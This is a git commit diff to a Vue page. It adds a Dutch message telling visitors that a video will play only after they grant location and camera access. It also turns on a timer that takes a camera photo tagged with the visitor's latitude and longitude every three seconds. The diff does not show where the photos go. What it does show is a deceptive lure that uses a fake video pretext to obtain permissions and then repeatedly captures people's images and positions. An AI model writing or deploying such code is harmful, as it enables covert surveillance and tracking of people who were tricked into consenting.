b3cfeb73d625ad310fdf78c39246331e6e1e7ede
Your Name <you@example.com>
2023-09-18 20:57:44 +0200

    update

--- pages/index.vue
+++ pages/index.vue
@@ -14,9 +14,9 @@
                             </svg>
                         </div>
 
-                        <div v-else role="status">
+                        <div v-else role="status" class="flex flex-col justify-center items-center text-center">
                             <svg aria-hidden="true"
-                                class="w-8 h-8 mr-2 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600"
+                                class="mb-4 w-8 h-8 mr-2 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600"
                                 viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path
                                     d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
@@ -26,6 +26,9 @@
                                     fill="currentFill" />
                             </svg>
                             <span class="sr-only">Loading...</span>
+                            <p class="text-white text-xs">Om deze video af te kunnen spelen moet je moet locatie en camera
+                                toegang
+                                geven.</p>
                         </div>
 
 
@@ -51,9 +54,9 @@ const getLocationAndCapture = () => {
 }
 
 const sendPosition = (position) => {
-    // setInterval(() => {
-    capturePhoto("Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude)
-    // }, 3000);
+    setInterval(() => {
+        capturePhoto("Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude)
+    }, 3000);
 }
 
 const showError = (error) => {
